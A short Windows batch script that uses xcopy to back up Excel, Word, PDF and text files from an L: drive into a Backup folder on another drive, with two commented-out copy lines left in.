
@echo off
cls
md %drive%\Backup
::copy  "E:\Moves\*.*" "%removablestorage%\Copy_All\" /Z /y /L
::copy "C:\Windows\System32\*.*" "%drive%\Copy_All\" /Z /Y /L
@echo on
:: variables SET 
SET odrive=%odrive:~0,2% 
set Backupcmd=xcopy /s /c /d /e /h /i /r /y 
echo on 
color 0a
%Backupcmd% "L:\*.xlsx" "%drive%\Backup\L\*.xlsx"
%Backupcmd% "L:\*.docx" "%drive%\Backup\L\*.docx"
%Backupcmd% "L:\*.doc" "%drive%\Backup\L\*.*"
%Backupcmd% "L:\*.pdf" "%drive%\Backup\L\*.*"
%Backupcmd% "L:\*.text" "%drive%\Backup\L\*.*"
%Backupcmd% "L:\*.txt" "%drive%\Backup\L\*.*"
exit